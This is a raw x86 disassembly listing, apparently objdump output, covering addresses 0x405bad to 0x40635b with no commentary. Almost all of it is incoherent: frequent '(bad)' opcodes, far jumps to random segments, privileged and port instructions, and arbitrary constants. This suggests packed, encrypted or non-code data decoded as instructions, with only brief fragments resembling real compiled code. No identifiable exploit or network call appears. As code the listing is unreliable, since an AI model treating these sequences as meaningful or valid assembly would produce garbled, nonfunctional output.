  405bad:	jmp    0x7e69bc60
  405bb2:	jle    0x405c09
  405bb4:	jg     0x405c34
  405bb6:	jle    0x405c10
  405bb8:	xchg   BYTE PTR [ebp-0x620c6d35],cl
  405bbe:	xchg   ebx,eax
  405bbf:	mov    al,0xc8
  405bc1:	retf   0x807d
  405bc4:	mov    ah,0x98
  405bc6:	jne    0x405c11
  405bc8:	xchg   edx,eax
  405bc9:	inc    esp
  405bca:	(bad)  
  405bcb:	cmp    edi,DWORD PTR [ebx+0x31]
  405bce:	mov    edi,0x672a5f80
  405bd3:	push   edi
  405bd4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405bd5:	mov    ds,WORD PTR [ecx-0x22]
  405bd8:	daa    
  405bd9:	dec    edi
  405bda:	or     bl,al
  405bdc:	sub    ch,BYTE PTR [esi+0x15]
  405bdf:	ret    
  405be0:	push   0xfa84bfa0
  405be5:	mov    ss,WORD PTR [ebx+0x35]
  405be8:	jmp    0xdc5f:0xc70e6dcf
  405bef:	mov    edx,0x566f4066
  405bf4:	(bad)  
  405bf5:	jge    0x405b9c
  405bf7:	adc    al,0xaa
  405bf9:	cmp    DWORD PTR ds:0x2ced7586,edi
  405bff:	repz aaa 
  405c01:	nop
  405c02:	clc    
  405c03:	add    BYTE PTR [ebx],dl
  405c05:	fldcw  WORD PTR [ecx]
  405c07:	mov    BYTE PTR [eax],bl
  405c09:	arpl   WORD PTR [ebx],cx
  405c0b:	es pushf 
  405c0d:	xor    BYTE PTR [ebx],dl
  405c0f:	mov    eax,0x99294d15
  405c14:	out    dx,eax
  405c15:	mov    bl,0x12
  405c17:	mov    ds:0xc74317dc,eax
  405c1c:	cmp    eax,0x63ba27cb
  405c21:	push   ecx
  405c22:	jle    0x405c6e
  405c24:	and    eax,0xac63c77c
  405c29:	pop    esi
  405c2a:	mov    cl,0x83
  405c2c:	jecxz  0x405be6
  405c2e:	test   BYTE PTR [edi],al
  405c30:	aam    0x2f
  405c32:	shl    DWORD PTR [esi+0x23],1
  405c35:	ins    BYTE PTR es:[edi],dx
  405c36:	imul   edi,DWORD PTR [eax+ecx*4-0x53da8252],0xc33cd0ab
  405c41:	jmp    0xeb25:0xafd7f9a8
  405c48:	arpl   si,dx
  405c4a:	aad    0x33
  405c4c:	mov    edx,0x723e7c69
  405c51:	popf   
  405c52:	pushf  
  405c53:	jp     0x405c1f
  405c55:	leave  
  405c56:	cld    
  405c57:	fldcw  WORD PTR ds:0xa2faa92d
  405c5d:	mov    edi,0x38230514
  405c62:	stc    
  405c63:	or     DWORD PTR [edi],ebx
  405c65:	mov    ah,0xe2
  405c67:	fcomi  st,st(1)
  405c69:	cmp    DWORD PTR [esi-0x5d9aaada],esp
  405c6f:	cmp    esp,ecx
  405c71:	jle    0x405c8d
  405c73:	mov    ecx,0x8e623ea6
  405c78:	enter  0x368f,0xbd
  405c7c:	in     al,0x44
  405c7e:	dec    ecx
  405c7f:	retf   
  405c80:	retf   
  405c81:	cmp    ch,bh
  405c83:	xor    DWORD PTR [ebp+0x18b0c822],esp
  405c89:	dec    eax
  405c8a:	jg     0x405c45
  405c8c:	retf   
  405c8d:	stos   BYTE PTR es:[edi],al
  405c8e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405c8f:	inc    ebx
  405c90:	mov    eax,0xe7adde59
  405c95:	adc    ebp,0x2b68c6fc
  405c9b:	add    ecx,DWORD PTR [esi]
  405c9d:	inc    esp
  405c9e:	xchg   ebp,eax
  405c9f:	fucomip st,st(0)
  405ca1:	jle    0x405cea
  405ca3:	ret    0xe3e5
  405ca6:	retf   0x29a8
  405ca9:	or     ebp,edi
  405cab:	jmp    0x981f:0x7205ae6e
  405cb2:	sahf   
  405cb3:	repz retf 0x8226
  405cb7:	push   ebx
  405cb8:	enter  0x3948,0x95
  405cbc:	dec    ebx
  405cbd:	or     eax,0x2f4f1ded
  405cc2:	sbb    al,0x9e
  405cc4:	sbb    eax,0xdc7e3c81
  405cc9:	adc    esp,edi
  405ccb:	fidiv  DWORD PTR [eax-0x4e]
  405cce:	push   ecx
  405ccf:	fldenv ds:0x6e44cccc
  405cd5:	sbb    al,0xc7
  405cd7:	cmc    
  405cd8:	arpl   WORD PTR [eax+0x6c],sp
  405cdb:	adc    BYTE PTR [edx-0x77],al
  405cde:	ins    BYTE PTR es:[edi],dx
  405cdf:	pop    ebp
  405ce0:	std    
  405ce1:	inc    edx
  405ce2:	mov    ?,WORD PTR [ecx-0x3b]
  405ce5:	jb     0x405d57
  405ce7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405ce8:	inc    ebx
  405ce9:	mov    bh,0xc3
  405ceb:	outs   dx,BYTE PTR ds:[esi]
  405cec:	xchg   ebx,eax
  405ced:	clc    
  405cee:	xchg   BYTE PTR [ebx-0x43b5784e],ch
  405cf4:	push   es
  405cf5:	in     eax,dx
  405cf6:	mov    esp,0x450d7dbe
  405cfb:	xchg   DWORD PTR [edi-0x35c4562a],ecx
  405d01:	int3   
  405d02:	push   0xd5955e03
  405d07:	mov    bl,0x67
  405d09:	jnp    0x405d17
  405d0b:	jge    0x405ccf
  405d0d:	int3   
  405d0e:	pop    ds
  405d0f:	call   0x7603:0xb3650f63
  405d16:	int3   
  405d17:	daa    
  405d18:	cwde   
  405d19:	xorps  xmm1,XMMWORD PTR [edx+0x1]
  405d1d:	imul   ecx,DWORD PTR [eax+0xf],0xf
  405d21:	push   esp
  405d22:	and    BYTE PTR [edx],ah
  405d24:	retf   
  405d25:	mov    ?,esi
  405d27:	xchg   BYTE PTR [ecx],dl
  405d29:	sub    bh,dl
  405d2b:	mov    ch,0x35
  405d2d:	aas    
  405d2e:	xchg   edx,eax
  405d2f:	std    
  405d30:	adc    bl,cl
  405d32:	add    eax,0xe4faa2fc
  405d37:	mov    ecx,0x9c3992fb
  405d3c:	xor    bl,ah
  405d3e:	retf   
  405d3f:	pop    esp
  405d40:	or     ebp,DWORD PTR [esp+ebp*4+0x5e3ca6df]
  405d47:	jecxz  0x405d15
  405d49:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405d4a:	in     eax,0xd6
  405d4c:	leave  
  405d4d:	cdq    
  405d4e:	mov    eax,ds:0x4f8630fa
  405d53:	std    
  405d54:	xchg   esp,eax
  405d55:	shr    dh,cl
  405d57:	jl     0x405dab
  405d59:	xchg   ebx,eax
  405d5a:	stos   BYTE PTR es:[edi],al
  405d5b:	pop    ebx
  405d5c:	sahf   
  405d5d:	test   BYTE PTR cs:[ebx-0x7],dh
  405d61:	int    0x7f
  405d63:	dec    esp
  405d64:	dec    ecx
  405d65:	mov    DWORD PTR [edi-0x67],ecx
  405d68:	(bad)  
  405d69:	out    dx,al
  405d6a:	jle    0x405d36
  405d6c:	cmp    DWORD PTR [edx-0x52],ebx
  405d6f:	sbb    eax,0xf69c2192
  405d74:	stos   DWORD PTR es:[edi],eax
  405d75:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405d76:	sbb    al,0x4
  405d78:	pop    esi
  405d79:	fnstcw WORD PTR [esi+ebx*8]
  405d7c:	cdq    
  405d7d:	pop    eax
  405d7e:	push   DWORD PTR [edx+0x661adede]
  405d84:	mov    ds:0xbec5c714,al
  405d89:	imul   ecx,DWORD PTR [esi+esi*2],0x938af828
  405d90:	scas   al,BYTE PTR es:[edi]
  405d91:	mov    ecx,0x8bf0458b
  405d96:	sbb    BYTE PTR [eax-0xffffff],0x30
  405d9d:	call   0x40cdc5
  405da2:	mov    DWORD PTR [ebp-0x8],eax
  405da5:	cmp    DWORD PTR [ebp-0x8],0x0
  405da9:	lea    eax,[ebp+0x4]
  405dac:	jmp    0x405fa4
  405db1:	xchg   ebx,eax
  405db2:	leave  
  405db3:	ror    DWORD PTR [esi-0x2eae69af],1
  405db9:	mov    ds:0x979c135b,al
  405dbe:	out    dx,al
  405dbf:	pushw  0x3747
  405dc3:	jle    0x405e43
  405dc5:	push   ebp
  405dc6:	jg     0x405e46
  405dc8:	jle    0x405dc4
  405dca:	xchg   ecx,eax
  405dcb:	jge    0x405e11
  405dcd:	mov    ebp,0x37ab9253
  405dd2:	inc    ebp
  405dd3:	jno    0x405d8b
  405dd5:	retf   0xf0e2
  405dd8:	mov    WORD PTR [esi],fs
  405dda:	dec    eax
  405ddb:	(bad)  
  405ddd:	sahf   
  405dde:	push   0x7d41ceb3
  405de3:	test   eax,0xa2f858cc
  405de8:	fnstcw WORD PTR [eax-0x30c00698]
  405dee:	imul   ebp,DWORD PTR [ebx+0x25],0xffffff8e
  405df2:	scas   eax,DWORD PTR es:[edi]
  405df3:	jb     0x405e43
  405df5:	inc    ebp
  405df6:	rcr    DWORD PTR [edx+0x79c1d6e6],cl
  405dfc:	mov    eax,DWORD PTR [ebx+0x21]
  405dff:	fcomp  QWORD PTR [eax+0x1f]
  405e02:	aad    0x8b
  405e04:	retf   
  405e05:	iret   
  405e06:	inc    esi
  405e07:	mov    BYTE PTR ss:[ecx-0xc],cl
  405e0b:	es push ebx
  405e0d:	push   ebp
  405e0e:	and    eax,0x42d5e7fb
  405e13:	adc    eax,0x697eef86
  405e18:	cdq    
  405e19:	adc    al,0x36
  405e1b:	mov    dh,0x52
  405e1d:	leave  
  405e1e:	mov    ch,0x7e
  405e20:	mov    esi,0x6cac36f
  405e25:	sub    eax,edi
  405e27:	dec    ecx
  405e28:	fdiv   DWORD PTR [edx]
  405e2a:	xchg   BYTE PTR [esi-0x77],bh
  405e2d:	aaa    
  405e2e:	inc    eax
  405e2f:	test   BYTE PTR [ebp-0x6c2864a1],bl
  405e35:	hlt    
  405e36:	fisttp DWORD PTR [edx+0x2a]
  405e39:	sti    
  405e3a:	arpl   WORD PTR ds:0x99ba2c4d,ax
  405e40:	pop    eax
  405e41:	lock jnp 0x405e6e
  405e44:	bound  edi,QWORD PTR [edi+0x98821ce]
  405e4a:	loop   0x405e35
  405e4c:	or     DWORD PTR [eax-0x1544eb5d],esi
  405e52:	stos   DWORD PTR es:[edi],eax
  405e53:	retf   0x6a00
  405e56:	cs das 
  405e58:	pop    ebp
  405e59:	dec    ebx
  405e5a:	(bad)
  405e5d:	(bad)  [ebx+edx*8+0xea7125]
  405e64:	mov    ecx,ebp
  405e66:	mov    dl,0x2f
  405e68:	aam    0xd2
  405e6a:	mov    ds:0x4843a709,al
  405e6f:	stc    
  405e70:	sar    cl,0x77
  405e73:	mov    edi,DWORD PTR [ecx-0x60]
  405e76:	sahf   
  405e77:	mul    ebx
  405e79:	test   BYTE PTR [edx-0x1d],al
  405e7c:	je     0x405ea5
  405e7e:	jns    0x405ece
  405e80:	mov    ds:0xb1b44c5f,eax
  405e85:	aam    0x4
  405e87:	cmp    esi,DWORD PTR [eax]
  405e89:	loope  0x405e43
  405e8b:	addr16 std 
  405e8d:	sahf   
  405e8e:	(bad)  
  405e8f:	mov    ds:0x7de45f2e,al
  405e94:	xchg   esp,eax
  405e95:	cmc    
  405e96:	mov    eax,ds:0x386ee3f3
  405e9b:	jle    0x405ef9
  405e9d:	mov    esi,0x31e01547
  405ea2:	pop    edx
  405ea3:	stos   BYTE PTR es:[edi],al
  405ea4:	aas    
  405ea5:	sub    eax,0x873f1223
  405eaa:	mov    ds:0xafd2804a,al
  405eaf:	mov    esi,0x2009b354
  405eb4:	push   ds
  405eb5:	sub    al,0x93
  405eb7:	cld    
  405eb8:	or     eax,0x17140a43
  405ebd:	sub    al,0x5
  405ebf:	loopne 0x405f11
  405ec1:	rol    DWORD PTR [ecx+0x7f73d487],cl
  405ec7:	xchg   BYTE PTR [edi],cl
  405ec9:	and    edx,edi
  405ecb:	mov    esp,0xf9da7776
  405ed0:	push   cs
  405ed1:	rol    BYTE PTR [esi],cl
  405ed3:	mov    ss,eax
  405ed5:	or     edx,DWORD PTR [ebx-0x10bcd774]
  405edb:	xor    BYTE PTR [ecx],bl
  405edd:	cmp    al,0x6
  405edf:	dec    eax
  405ee0:	mov    ch,0xbc
  405ee2:	aaa    
  405ee3:	add    ebp,DWORD PTR [esi-0x15]
  405ee6:	push   es
  405ee7:	mov    al,ds:0x4735266c
  405eec:	stc    
  405eed:	in     eax,dx
  405eee:	mov    BYTE PTR [edi-0x6b],al
  405ef1:	sub    al,0x88
  405ef3:	repnz in eax,dx
  405ef5:	jns    0x405ea6
  405ef7:	mov    ds:0xc5496831,eax
  405efc:	push   ecx
  405efd:	or     DWORD PTR [edi+0x69],0x74
  405f01:	sbb    al,0x70
  405f03:	push   0xffffffbf
  405f05:	pop    esi
  405f06:	push   ss
  405f07:	mov    BYTE PTR [edx+0x26],dh
  405f0a:	or     al,0x95
  405f0c:	add    eax,0xb5ccdac2
  405f11:	jno    0x405f5d
  405f13:	cmp    ecx,ecx
  405f15:	imul   al
  405f17:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405f18:	jno    0x405ecc
  405f1a:	scas   eax,DWORD PTR es:[edi]
  405f1b:	retf   
  405f1c:	mov    ebp,0x1b4ab825
  405f21:	repnz icebp 
  405f23:	cli    
  405f24:	fdiv   DWORD PTR [edi]
  405f26:	inc    edi
  405f27:	scas   al,BYTE PTR es:[edi]
  405f28:	imul   edx,DWORD PTR [edx+0x5],0xcf4b4975
  405f2f:	inc    esi
  405f30:	je     0x405f0b
  405f32:	cmp    ch,BYTE PTR [ebp+0x7d786c9f]
  405f38:	add    ebp,DWORD PTR [esi+0x67]
  405f3b:	and    BYTE PTR [ecx-0x6f3186da],bl
  405f41:	clc    
  405f42:	mov    dh,cl
  405f44:	xor    DWORD PTR [ecx],esi
  405f46:	inc    eax
  405f47:	sbb    al,BYTE PTR [eax+0x57]
  405f4a:	repnz push ss
  405f4c:	mov    al,ds:0x8873e788
  405f51:	mov    esp,0x492dc275
  405f56:	shl    DWORD PTR [edi+0x24],0xd
  405f5a:	mov    edx,0xfd30f84
  405f5f:	pop    esi
  405f60:	ins    DWORD PTR es:[edi],dx
  405f61:	cmp    bh,BYTE PTR [edi-0x362bbb02]
  405f67:	inc    edx
  405f68:	lahf   
  405f69:	mov    cl,0x82
  405f6b:	mov    BYTE PTR [ebx-0x5077b657],bh
  405f71:	dec    ebp
  405f72:	xor    ah,BYTE PTR [edi+0xd682bb9]
  405f78:	loop   0x405f26
  405f7a:	ret    
  405f7b:	ja     0x405fed
  405f7d:	pop    esp
  405f7e:	sub    ah,dh
  405f80:	mov    esi,0xd6ca94fe
  405f85:	not    DWORD PTR [edx-0xc]
  405f88:	and    DWORD PTR [edx-0x70],eax
  405f8b:	aam    0x34
  405f8d:	push   0x6c
  405f8f:	inc    edx
  405f90:	dec    edx
  405f91:	retf   
  405f92:	ds push ebx
  405f94:	icebp  
  405f95:	dec    edx
  405f96:	jnp    0x405f27
  405f98:	push   ss
  405f99:	xchg   DWORD PTR [eax+0x4f258528],eax
  405f9f:	inc    esp
  405fa0:	xlat   BYTE PTR ds:[ebx]
  405fa1:	daa    
  405fa2:	cmp    esi,DWORD PTR [edx-0x77]
  405fa5:	inc    ebp
  405fa6:	loopne 0x405fb7
  405fa8:	test   BYTE PTR [esi-0x16fffff6],dl
  405fae:	repz add DWORD PTR [eax],eax
  405fb1:	add    bl,ch
  405fb3:	hlt    
  405fb4:	pushf  
  405fb5:	dec    esi
  405fb6:	mov    eax,ds:0x9371e956
  405fbb:	inc    ebx
  405fbc:	and    dl,BYTE PTR [ecx-0x7e]
  405fbf:	jae    0x405fdf
  405fc1:	add    DWORD PTR [edx+0x557e7e35],ebx
  405fc7:	jg     0x406047
  405fc9:	jle    0x405f96
  405fcb:	ds pop ss
  405fcd:	push   esi
  405fce:	cwde   
  405fcf:	jecxz  0x405feb
  405fd1:	sar    DWORD PTR [esi-0x2c],cl
  405fd4:	clc    
  405fd5:	push   esi
  405fd6:	mov    ebp,0xcfa4c3ac
  405fdb:	cmp    ebp,DWORD PTR [edx+0x6000bb8a]
  405fe1:	or     BYTE PTR [ebx-0x1e147965],bh
  405fe7:	mov    dl,0xf4
  405fe9:	(bad)  
  405fea:	pop    eax
  405feb:	stos   DWORD PTR es:[edi],eax
  405fec:	mul    BYTE PTR [edx-0x4c]
  405fef:	push   ds
  405ff0:	xchg   DWORD PTR [edx-0x62],edx
  405ff3:	push   0xffffff8f
  405ff5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405ff6:	scas   eax,DWORD PTR es:[edi]
  405ff7:	(bad)  [esi]
  405ff9:	inc    esp
  405ffa:	mov    edi,db6
  405ffd:	out    dx,eax
  405ffe:	int    0x94
  406000:	and    esp,DWORD PTR [ecx+0x6]
  406003:	xor    ebx,DWORD PTR ds:0xb42425ad
  406009:	scas   eax,DWORD PTR es:[edi]
  40600a:	adc    al,0xf9
  40600c:	lahf   
  40600d:	repz cdq 
  40600f:	mov    dh,0xdd
  406011:	push   ebx
  406012:	jo     0x406055
  406014:	mov    fs,WORD PTR [edx-0x6c]
  406017:	int    0x25
  406019:	lods   eax,DWORD PTR ds:[esi]
  40601a:	jmp    0x40607b
  40601c:	(bad)  
  40601d:	mov    eax,0x30b138f1
  406022:	xor    eax,0x4c549dba
  406027:	fcom   DWORD PTR [ebx]
  406029:	cwde   
  40602a:	sti    
  40602b:	ror    edi,1
  40602d:	xchg   DWORD PTR [ecx],esi
  40602f:	add    al,0x84
  406031:	push   edi
  406032:	test   DWORD PTR [edx+0x58],edi
  406035:	and    bl,ah
  406037:	popf   
  406038:	int    0xb9
  40603a:	mov    ebx,0x967133df
  40603f:	mov    bl,0x5
  406041:	xchg   ecx,eax
  406042:	lods   eax,DWORD PTR ds:[esi]
  406043:	test   bh,al
  406045:	in     al,0xb6
  406047:	out    0xc9,eax
  406049:	add    BYTE PTR [ecx+0xb],dh
  40604c:	loope  0x406085
  40604e:	bswap  ecx
  406050:	ds xchg ecx,eax
  406052:	ret    0x84c4
  406055:	sub    bh,bl
  406057:	stos   DWORD PTR es:[edi],eax
  406058:	sub    esi,ecx
  40605a:	cmp    al,BYTE PTR [ebx]
  40605c:	fistp  DWORD PTR [esi+eax*2+0x18c8841c]
  406063:	into   
  406064:	and    ebx,DWORD PTR [eax-0x239c176b]
  40606a:	nop
  40606b:	loopne 0x406002
  40606d:	dec    ecx
  40606e:	mov    BYTE PTR [ecx+0x61],bh
  406071:	clc    
  406072:	cli    
  406073:	jmp    0x406073
  406075:	popa   
  406076:	int3   
  406077:	imul   esi,ebx,0x74512f1
  40607d:	mov    esi,0xe583cdc9
  406082:	adc    bl,BYTE PTR [ebx]
  406084:	dec    esp
  406085:	lods   eax,DWORD PTR ds:[esi]
  406086:	popaw  
  406088:	fstp   DWORD PTR [edi]
  40608a:	xlat   BYTE PTR ds:[ebx]
  40608b:	out    0xc4,eax
  40608d:	push   ebx
  40608e:	push   edx
  40608f:	mov    esp,edi
  406091:	cdq    
  406092:	adc    ah,ch
  406094:	ins    BYTE PTR es:[edi],dx
  406095:	sti    
  406096:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406097:	stc    
  406098:	rol    DWORD PTR [esi+ebx*4-0x3f],0xde
  40609d:	ss sahf 
  40609f:	mov    eax,0x8634ac85
  4060a4:	jmp    0xe19a87c8
  4060a9:	ss push eax
  4060ab:	sbb    eax,0xfb30359
  4060b0:	popf   
  4060b1:	pusha  
  4060b2:	mov    ds:0xe81aafb7,eax
  4060b7:	dec    eax
  4060b8:	ds (bad) 
  4060ba:	fstp   st(2)
  4060bc:	inc    edx
  4060bd:	scas   al,BYTE PTR es:[edi]
  4060be:	push   ebx
  4060bf:	sar    BYTE PTR [edi],0x36
  4060c2:	inc    ecx
  4060c3:	cmp    bl,ch
  4060c5:	arpl   cx,bp
  4060c7:	jbe    0x406093
  4060c9:	in     eax,0xec
  4060cb:	xor    BYTE PTR [esi+edx*1],al
  4060ce:	sbb    esi,DWORD PTR [esi+0x5b]
  4060d1:	jne    0x40607a
  4060d3:	pusha  
  4060d4:	fistp  QWORD PTR [ebx]
  4060d6:	sub    ebx,DWORD PTR [ebx]
  4060d8:	dec    edx
  4060d9:	adc    DWORD PTR [ecx-0x509ca96f],edx
  4060df:	jmp    0xc393:0x2e1ef253
  4060e6:	sbb    al,0x25
  4060e8:	addr16 push es
  4060ea:	ds cmp dh,bh
  4060ed:	rcl    BYTE PTR ds:0x1f51d906,cl
  4060f3:	mov    dh,0x5f
  4060f5:	dec    edx
  4060f6:	or     ah,BYTE PTR [edi+0x64]
  4060f9:	test   al,0x18
  4060fb:	fwait
  4060fc:	cmp    bh,cl
  4060fe:	aas    
  4060ff:	shr    cl,0x9f
  406102:	(bad)  
  406103:	mov    esp,0x7bc4398a
  406108:	ret    0x23f2
  40610b:	add    dl,BYTE PTR [esi+0x40cb11ec]
  406111:	jl     0x406190
  406113:	popa   
  406114:	jmp    0x406177
  406116:	push   0x1a
  406118:	mov    bl,0x7b
  40611a:	jno    0x40615b
  40611c:	test   DWORD PTR [ebx],0xb2ef162b
  406122:	push   0xa1ba3e36
  406127:	jg     0x40615b
  406129:	or     eax,0xa96c9fcd
  40612e:	js     0x406194
  406130:	jg     0x406101
  406132:	aad    0xd1
  406134:	scas   eax,DWORD PTR es:[edi]
  406135:	xchg   BYTE PTR [edx-0x31],dl
  406138:	retf   
  406139:	jbe    0x40612e
  40613b:	mov    ecx,0x1fb07912
  406140:	retf   0xff6d
  406143:	mov    bh,0x9f
  406145:	xchg   edi,eax
  406146:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406147:	mov    cl,0x92
  406149:	popa   
  40614a:	cmp    al,0x52
  40614c:	and    edx,DWORD PTR [edx+0x3d]
  40614f:	addr16 sbb edi,edi
  406152:	and    eax,ebp
  406154:	cmc    
  406155:	and    al,0x74
  406157:	xchg   edi,eax
  406158:	sub    al,0x8f
  40615a:	cdq    
  40615b:	in     eax,dx
  40615c:	lods   eax,DWORD PTR ds:[esi]
  40615d:	xor    DWORD PTR [eax-0x306569b6],ebp
  406163:	(bad)  
  406164:	sti    
  406165:	push   ebp
  406166:	mov    ch,0x54
  406168:	out    dx,eax
  406169:	mov    ecx,0xc7e7db9b
  40616e:	dec    esi
  40616f:	add    edi,eax
  406171:	mov    bl,0x43
  406173:	pop    edx
  406174:	xor    BYTE PTR [edi-0x5a],ah
  406177:	push   edx
  406178:	pushf  
  406179:	mov    DWORD PTR [eax-0x49f9f2d7],ebx
  40617f:	test   al,0xa3
  406181:	pop    ds
  406182:	xchg   edi,eax
  406183:	mov    gs,WORD PTR [ebx]
  406185:	loopne 0x40614b
  406187:	cli    
  406188:	in     eax,dx
  406189:	sbb    DWORD PTR [edx-0x54a0a8e6],0x4d005820
  406193:	inc    esp
  406194:	sbb    eax,0x9c3a41be
  406199:	mov    cl,0x2b
  40619b:	and    BYTE PTR [eax-0x4757a42b],ch
  4061a1:	mov    bl,0xc8
  4061a3:	test   eax,0xe8458d39
  4061a8:	push   eax
  4061a9:	mov    eax,DWORD PTR [ebp-0x2c]
  4061ac:	xor    eax,esi
  4061ae:	add    eax,edi
  4061b0:	push   eax
  4061b1:	mov    eax,DWORD PTR [ebp-0x1c]
  4061b4:	xor    eax,esi
  4061b6:	add    eax,edi
  4061b8:	push   eax
  4061b9:	push   DWORD PTR [ebp-0x8]
  4061bc:	lea    eax,[ebp-0x78]
  4061bf:	push   eax
  4061c0:	jmp    0x4063b8
  4061c5:	cmp    eax,0xb41aac57
  4061ca:	loope  0x406215
  4061cc:	jno    0x406181
  4061ce:	dec    edi
  4061cf:	add    dl,cl
  4061d1:	pop    ebx
  4061d2:	pusha  
  4061d3:	xchg   ecx,eax
  4061d4:	add    al,0xf1
  4061d6:	xor    edi,DWORD PTR [esi+0x7e]
  4061d9:	push   ebp
  4061da:	jg     0x40625a
  4061dc:	jle    0x4061d0
  4061de:	push   es
  4061df:	xchg   dl,ch
  4061e1:	lock dec ecx
  4061e3:	call   0x14071d70
  4061e8:	xor    DWORD PTR [ecx+0x11],edx
  4061eb:	push   ds
  4061ec:	retf   0xf894
  4061ef:	fist   WORD PTR [edi-0x7f]
  4061f2:	mov    BYTE PTR [esi+0x35],dh
  4061f5:	sub    BYTE PTR [esi-0x15],ah
  4061f8:	adc    al,0xf
  4061fa:	not    BYTE PTR [ebx+0x1c05d21d]
  406200:	stos   BYTE PTR es:[edi],al
  406201:	stos   BYTE PTR es:[edi],al
  406202:	shr    ah,1
  406204:	dec    ebx
  406205:	shl    DWORD PTR [edi-0x2a4a307b],0x83
  40620c:	sub    BYTE PTR [edi-0x46b5ba99],bh
  406212:	mov    ebp,DWORD PTR [esi-0x2b421a19]
  406218:	cmp    BYTE PTR [edi-0x1e66739],bh
  40621e:	test   BYTE PTR [eax],bh
  406220:	jbe    0x4061a5
  406222:	(bad)  [ebp-0x2d9571bb]
  406228:	jbe    0x4062a1
  40622a:	and    al,0xa8
  40622c:	pop    ecx
  40622d:	arpl   WORD PTR gs:[ebp-0x7ae7775],sp
  406234:	and    ecx,DWORD PTR [ebp+0x2a]
  406237:	jbe    0x4061ff
  406239:	hlt    
  40623a:	cli    
  40623b:	std    
  40623c:	loop   0x406273
  40623e:	jmp    0x14b:0x8bef2f1f
  406245:	dec    esi
  406246:	fwait
  406247:	jmp    0x4061df
  406249:	rol    ebx,0xbf
  40624c:	sub    esi,DWORD PTR [edx-0x2]
  40624f:	retf   
  406250:	daa    
  406251:	mov    esp,esi
  406253:	xor    ebp,ebx
  406255:	jbe    0x4062d5
  406257:	inc    ebp
  406258:	xchg   esi,eax
  406259:	dec    ebx
  40625a:	sahf   
  40625b:	sub    DWORD PTR [esp+ebp*2-0x59],eax
  40625f:	cmp    BYTE PTR [eax+0x59cececa],ch
  406265:	iret   
  406266:	shl    BYTE PTR [eax+0x15],0xf5
  40626a:	sub    eax,0x7d7ebb5a
  40626f:	pop    ss
  406270:	adc    esi,ebp
  406272:	hlt    
  406273:	rcl    DWORD PTR [eax+0x48a38b37],0x66
  40627a:	dec    edx
  40627b:	jo     0x406228
  40627d:	fdiv   DWORD PTR [esi-0x26]
  406280:	push   0x6b
  406282:	jns    0x4062ec
  406284:	fmul   QWORD PTR [edx]
  406286:	xor    DWORD PTR ds:[ecx+0x67404281],eax
  40628d:	(bad)  
  40628e:	sbb    al,0xdc
  406290:	lods   eax,DWORD PTR ds:[esi]
  406291:	mov    bl,0x7e
  406293:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406294:	(bad)
  406297:	stc    
  406298:	mov    edx,0xc78f7e1a
  40629d:	iret   
  40629e:	popw   ss
  4062a0:	stc    
  4062a1:	int    0x3f
  4062a3:	sbb    DWORD PTR [ebx],ecx
  4062a5:	jae    0x40624c
  4062a7:	fcmovne st,st(0)
  4062a9:	and    esp,DWORD PTR [edi-0x3b]
  4062ac:	jg     0x4062c1
  4062ae:	(bad)  
  4062af:	enter  0x5895,0xf2
  4062b3:	loope  0x4062e2
  4062b5:	cmc    
  4062b6:	push   esp
  4062b7:	cmp    al,0x16
  4062b9:	pop    ds
  4062ba:	mov    WORD PTR [esi-0x67ebf6fa],es
  4062c0:	outs   dx,DWORD PTR ds:[esi]
  4062c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4062c2:	ror    BYTE PTR [edi],1
  4062c4:	jle    0x40627b
  4062c6:	inc    ebx
  4062c7:	in     al,0xa1
  4062c9:	pushf  
  4062ca:	mov    ch,0x22
  4062cc:	pop    eax
  4062cd:	dec    ecx
  4062ce:	pushf  
  4062cf:	(bad)  
  4062d0:	sub    ah,ah
  4062d2:	mov    ch,0xce
  4062d4:	jp     0x40625f
  4062d6:	int    0x4b
  4062d8:	xchg   ecx,eax
  4062d9:	add    al,0xa3
  4062db:	push   esi
  4062dc:	push   0xffffff8d
  4062de:	jg     0x4062c5
  4062e0:	inc    edx
  4062e1:	mov    dh,0x7a
  4062e3:	xchg   ecx,eax
  4062e4:	mov    edi,0xa4d5225e
  4062e9:	push   ebp
  4062ea:	aaa    
  4062eb:	cmp    DWORD PTR [edx-0x7d],ebp
  4062ee:	fs pushf 
  4062f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4062f1:	xlat   BYTE PTR ds:[ebx]
  4062f2:	sbb    BYTE PTR [edx+0x42],dh
  4062f5:	cld    
  4062f6:	mov    ds:0x2f5070a7,eax
  4062fb:	inc    edi
  4062fc:	jecxz  0x406349
  4062fe:	pop    edx
  4062ff:	(bad)  
  406300:	int    0x7d
  406302:	or     edx,DWORD PTR [eax-0x617671c1]
  406308:	xchg   BYTE PTR [esi+0x2425cbb5],cl
  40630e:	push   0x59f66d2d
  406313:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406314:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406315:	and    cl,bl
  406317:	out    dx,eax
  406318:	cmp    dh,BYTE PTR [edx+ecx*1-0x34701826]
  40631f:	cmp    dl,BYTE PTR [ebx]
  406321:	sub    al,0x1e
  406323:	fsubp  st(1),st
  406325:	out    0xaa,eax
  406327:	gs pop esp
  406329:	xchg   ebx,eax
  40632a:	cmp    eax,0x1e8338b8
  40632f:	fdivr  st,st(7)
  406331:	(bad)  
  406333:	test   DWORD PTR [ebp+0x9],eax
  406336:	fwait
  406337:	or     ecx,DWORD PTR [edx-0x2c9c3f79]
  40633d:	bswap  edx
  40633f:	sbb    DWORD PTR [ebx+eiz*2-0x5ed1a25a],edx
  406346:	push   ebp
  406347:	(bad)  
  406348:	rcr    BYTE PTR [edx],1
  40634a:	je     0x4062f7
  40634c:	out    0x69,al
  40634e:	xchg   ebp,eax
  40634f:	call   0x706aecd5
  406354:	std    
  406355:	cmp    eax,0x30e6bd4b
  40635a:	dec    edx
  40635b:	and    ebp,DWORD PTR [esi+0x241627c1]
